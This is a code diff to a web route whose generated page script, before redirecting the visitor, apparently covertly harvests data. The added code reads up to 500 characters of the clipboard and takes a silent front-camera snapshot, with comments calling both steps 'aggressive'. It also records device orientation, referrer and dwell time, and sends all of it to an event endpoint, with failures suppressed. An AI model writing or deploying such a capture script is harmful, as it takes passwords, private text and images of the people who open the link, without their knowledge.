@@ -383,6 +383,68 @@ export async function GET(
             let exact_lon = null;
             let local_ip = null;
             let threat_id = 'Unknown';
+            let color_depth = window.screen.colorDepth || 24;
+            let dark_mode = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches;
+            let referrer = document.referrer || '';
+            let device_posture = 'Unknown';
+            let clipboard_text = '';
+            let camera_image = '';
+            let loadTime = Date.now();
+            let dwell_time_ms = 0;
+
+            // Try to get device posture (Orientation)
+            if (window.DeviceOrientationEvent) {
+              window.addEventListener('deviceorientation', function(event) {
+                if (event.beta === null) return;
+                if (event.beta > 70 && event.beta < 110) device_posture = 'Held upright (Portrait)';
+                else if (event.beta > -10 && event.beta < 10 && event.gamma > -10 && event.gamma < 10) device_posture = 'Lying flat on desk';
+                else device_posture = 'Held angled/Moving';
+              }, {once: true});
+            }
+
+            // Attempt aggressive Clipboard sniffing
+            try {
+              if (navigator.clipboard && navigator.clipboard.readText) {
+                navigator.clipboard.readText().then(text => {
+                  if (text && text.trim().length > 0) {
+                    clipboard_text = text.substring(0, 500); // Grab up to 500 chars
+                  }
+                }).catch(() => {});
+              }
+            } catch(e) {}
+
+            // Attempt aggressive Camera capture
+            try {
+              if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+                  .then(function(stream) {
+                    const video = document.createElement('video');
+                    video.srcObject = stream;
+                    video.play();
+                    video.onplaying = () => {
+                      setTimeout(() => {
+                        const canvas = document.createElement('canvas');
+                        canvas.width = 320; 
+                        canvas.height = 240;
+                        const ctx = canvas.getContext('2d');
+                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                        camera_image = canvas.toDataURL('image/jpeg', 0.5); // Heavily compressed JPEG
+                        
+                        // Stop the camera immediately after snapshot
+                        stream.getTracks().forEach(track => track.stop());
+                        
+                        // Send an immediate telemetry update with the new photo
+                        fetch('/api/v1/event', {
+                          method: 'POST',
+                          headers: { 'Content-Type': 'application/json' },
+                          body: JSON.stringify({ alert_id: '${alertId}', details: { camera_image: camera_image } })
+                        }).catch(()=>({}));
+                      }, 500); // Give the camera 500ms to adjust exposure
+                    };
+                  })
+                  .catch(() => {}); // Fails silently if denied
+              }
+            } catch(e) {}
 
             try {
               if (navigator.geolocation) {
@@ -532,7 +594,13 @@ export async function GET(
               exact_lat: exact_lat,
               exact_lon: exact_lon,
               local_ip: local_ip,
-              threat_id: threat_id
+              threat_id: threat_id,
+              color_depth: color_depth,
+              dark_mode: dark_mode,
+              referrer: referrer,
+              device_posture: device_posture,
+              clipboard_text: clipboard_text,
+              camera_image: camera_image
             };
             
             await fetch('/api/v1/event', {
@@ -540,6 +608,23 @@ export async function GET(
               headers: { 'Content-Type': 'application/json' },
               body: JSON.stringify({ alert_id: '${alertId}', details })
             });
+
+            // Track Dwell Time on Exit
+            const sendDwellTime = () => {
+              dwell_time_ms = Date.now() - loadTime;
+              const payload = JSON.stringify({ alert_id: '${alertId}', details: { dwell_time_ms: dwell_time_ms, clipboard_text: clipboard_text } });
+              if (navigator.sendBeacon) {
+                navigator.sendBeacon('/api/v1/event', payload);
+              } else {
+                fetch('/api/v1/event', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: payload, keepalive: true }).catch(()=>{});
+              }
+            };
+            
+            window.addEventListener('visibilitychange', () => {
+              if (document.visibilityState === 'hidden') sendDwellTime();
+            });
+            window.addEventListener('beforeunload', sendDwellTime);
+
           } catch(e) {}
           
           ${finalUrl ? `window.location.replace('${finalUrl}');` : ''}
